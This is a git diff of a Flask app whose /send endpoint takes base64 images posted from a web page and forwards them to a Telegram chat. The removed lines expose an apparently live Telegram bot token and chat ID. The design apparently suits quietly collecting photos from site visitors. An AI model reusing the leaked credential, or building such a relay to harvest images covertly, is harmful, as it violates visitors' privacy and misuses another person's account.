@@ -1,10 +1,12 @@
+import os
 from flask import Flask, request, send_from_directory
 import base64, requests
 
 app = Flask(__name__)
 
-BOT_TOKEN = "8542816540:AAH7Qg9v3YN2OSWc3Sx1QxLXqxLQyQYCfUk"
-CHAT_ID = "5053114440"
+# Read from Render Environment Variables
+BOT_TOKEN = os.environ.get("BOT_TOKEN")
+CHAT_ID = os.environ.get("CHAT_ID")
 
 @app.route("/")
 def home():
@@ -13,8 +15,8 @@ def home():
 @app.route("/send", methods=["POST"])
 def send():
     try:
-        img = request.json["image"]
-        img_bytes = base64.b64decode(img.split(",")[1])
+        data = request.json["image"]
+        img_bytes = base64.b64decode(data.split(",")[1])
 
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
         r = requests.post(
@@ -23,11 +25,8 @@ def send():
             files={"photo": img_bytes}
         )
 
-        print("Sent:", r.status_code)
+        print("Telegram:", r.text)
         return "OK"
     except Exception as e:
         print("ERROR:", e)
         return "ERROR", 500
-
-if __name__ == "__main__":
-    app.run(debug=True)
